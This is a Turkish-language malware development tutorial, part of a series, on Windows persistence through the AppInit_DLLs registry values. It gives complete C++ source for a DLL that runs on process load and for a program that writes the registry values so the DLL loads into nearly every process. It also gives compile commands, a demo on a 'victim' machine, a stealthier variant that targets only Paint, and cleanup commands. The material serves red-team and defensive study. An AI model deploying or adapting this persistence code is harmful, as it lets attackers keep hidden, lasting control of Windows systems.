\newpage
\subsection{71. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 5. AppInit_DLLs. Basit C++ örneği.}

![pers](./images/55/2022-05-16_07-00.png){width="80%"}    

Bu bölüm, Windows'ta kötü amaçlı yazılım kalıcılığına yönelik teknikler ve yöntemler serisinin bir sonraki parçasıdır.    

Bugün, kendi araştırmalarımın bir sonucu olarak keşfettiğim başka bir kalıcılık yöntemini ele alacağım: AppInit_DLLs.    

Windows işletim sistemleri, neredeyse tüm uygulama süreçlerinin özel DLL'leri adres alanlarına yüklemesine olanak tanıyan bir özelliğe sahiptir. Bu, herhangi bir DLL'in sistemde uygulama süreçleri oluşturulduğunda yüklenip çalıştırılmasına izin verdiğinden, bir kalıcılık yöntemi olarak kullanılabilir.      

### AppInit DLL'leri

Bu yöntemi uygulamak için yönetici düzeyinde ayrıcalıklara sahip olmak gereklidir. AppInit üzerinden DLL yüklemelerini düzenleyen aşağıdaki kayıt defteri anahtarları bulunmaktadır:    

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows` - 32-bit     

- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows` - 64-bit    

İlgilendiğimiz değerler şunlardır:    

```powershell
reg query \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /s
```

![pers](./images/55/2022-05-16_00-21.png){width="80%"}    

ve `64-bit` için:   

```powershell
reg query \
"HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\
Windows" \
 /s
```

![pers](./images/55/2022-05-16_01-20.png){width="80%"}    

Microsoft, Windows kullanıcılarını kötü amaçlı yazılımlardan korumak için AppInit DLL’leri üzerinden DLL yüklemeyi varsayılan olarak devre dışı bırakmıştır (`LoadAppInit_DLLs`). Ancak, `LoadAppInit_DLLs` kayıt defteri anahtarını `1` olarak ayarlayarak bu özelliği etkinleştirebiliriz.    

### pratik örnek

Öncelikle, kötü amaçlı bir DLL oluşturalım. Her zamanki gibi, "meow-meow" mesaj kutusunu açan bir mantık kullanacağım:    

```cpp
/*
evil.cpp
inject via Appinit_DLLs
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/16/malware-pers-5.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

extern "C" {
  __declspec(dllexport) BOOL WINAPI runMe(void) {
  MessageBoxA(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return TRUE;
  }
}

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    runMe();
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Haydi şunu derleyelim:    

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive
```

![pers](./images/55/2022-05-16_01-21.png){width="80%"}    

Then simple logic: changing the registry key `AppInit_DLLs` to contain the path to the DLL, as a result, `evil.dll` will be loaded.

Ardından basit bir mantık uygulayarak, `AppInit_DLLs` kayıt defteri anahtarını `evil.dll` dosyasının yolunu içerecek şekilde değiştiriyoruz. Bunun sonucunda `evil.dll` otomatik olarak yüklenecektir.    

Bunun için başka bir uygulama olan `pers.cpp` dosyasını oluşturalım:      

```cpp
/*
pers.cpp
windows low level persistense via Appinit_DLLs
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/16/malware-pers-5.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  // malicious DLL
  const char* dll = "Z:\\2022-05-16-malware-pers-5\\evil.dll";
  // activation
  DWORD act = 1;

  // 32-bit and 64-bit
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
  (LPCSTR)
  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 
  0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry keys
    RegSetValueEx(hkey, (LPCSTR)"LoadAppInit_DLLs", 
    0, REG_DWORD, (const BYTE*)&act, sizeof(act));
    RegSetValueEx(hkey, (LPCSTR)"AppInit_DLLs", 
    0, REG_SZ, (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  }

  res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
  (LPCSTR)
  "SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\
  Windows", 
  0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry keys
    RegSetValueEx(hkey, (LPCSTR)"LoadAppInit_DLLs", 
    0, REG_DWORD, (const BYTE*)&act, sizeof(act));
    RegSetValueEx(hkey, (LPCSTR)"AppInit_DLLs", 
    0, REG_SZ, (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  }
  return 0;
}
```

Gördüğünüz gibi, `LoadAppInit_DLLs` kayıt defteri anahtarını `1` olarak ayarlamak da önemlidir.   

Şimdi bunu derleyelim:   

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/55/2022-05-16_01-22.png){width="80%"}    

### demo

Hadi her şeyi çalışırken görelim! Tüm dosyaları kurbanın makinesine (benim durumumda `Windows 10 x64`) aktarın.   

Ardından, Yönetici olarak çalıştırın:    

```powershell
.\pers.exe
```

ve:

```powershell
reg query \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \
 /s
reg query \
"HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\
Windows" /s
```

sadece control edelim.   

![pers](./images/55/2022-05-16_05-42.png){width="80%"}    

Ardından, gösterim amacıyla `Paint` veya `Notepad` gibi bir uygulama açın:    

![pers](./images/55/2022-05-16_06-59.png){width="80%"}    

![pers](./images/55/2022-05-16_07-00_1.png){width="80%"}    

Bu nedenle, her şey mükemmel şekilde çalıştı :)     

### İkinci örnek

Bununla birlikte, bu yöntemin uygulanması hedef sistemde kararlılık ve performans sorunlarına neden olabilir:     

![pers](./images/55/2022-05-16_10-44.png){width="80%"}    

Ayrıca, ilk DLL'in mantığının oldukça garip olduğunu düşünüyorum, çünkü birden fazla mesaj kutusu açılıyor. Gerçek hayatta red team senaryolarında hareket ettiğimizde bu oldukça gürültülü oluyor, özellikle birden fazla ters bağlantı (reverse shell) oluşturulduğunda.    

Bu yüzden, `evil.dll` mantığını biraz güncellemeyi denedim:   

```cpp
/*
evil2.cpp
inject via Appinit_DLLs - only for `mspaint.exe`
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/16/malware-pers-5.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

char* subStr(char *str, char *substr) {
  while (*str) {
    char *Begin = str;
    char *pattern = substr;
    while (*str && *pattern && *str == *pattern) {
      str++;
      pattern++;
    }
    if (!*pattern)
  	  return Begin;

    str = Begin + 1;
  }
  return NULL;
}

extern "C" {
  __declspec(dllexport) BOOL WINAPI runMe(void) {
  MessageBoxA(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return TRUE;
  }
}

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD  nReason, LPVOID lpReserved) {
  char path[MAX_PATH];
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    GetModuleFileName(NULL, path, MAX_PATH);
    if (subStr(path, (char *)"paint")) {
      runMe();
    }
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Gördüğünüz gibi, eğer mevcut süreç `paint` ise (ve `32-bit` ise), o zaman "enjekte et" :)   

![pers](./images/55/2022-05-16_10-49.png){width="80%"}    

Mükemmel! :)   

![pers](./images/55/2022-05-16_10-59.png){width="80%"}    

Deneyler bittikten sonra temizleme işlemi için:    

```powershell
reg add \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \
/v LoadAppInit_DLLs /d 0
reg add \
"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" \
/v AppInit_DLLs /t REG_SZ /f
```

![pers](./images/55/2022-05-16_11-18.png){width="80%"}    

Bu teknik yeni değildir, ancak buna dikkat etmek gerekir. Gerçek saldırılarda, bu numara genellikle [APT 39](https://attack.mitre.org/groups/G0087) gibi gruplar ve [Ramsay](https://attack.mitre.org/software/S0458/) gibi kötü amaçlı yazılımlar tarafından kullanılmıştır.    

[MITRE ATT&CK: APPInit_DLLs](https://attack.mitre.org/techniques/T1546/010/)    
[APT39](https://attack.mitre.org/groups/G0087)    
[Ramsay](https://attack.mitre.org/software/S0458/)    
[github'taki kaynak kod](https://github.com/cocomelonc/2022-05-16-malware-pers-5)    
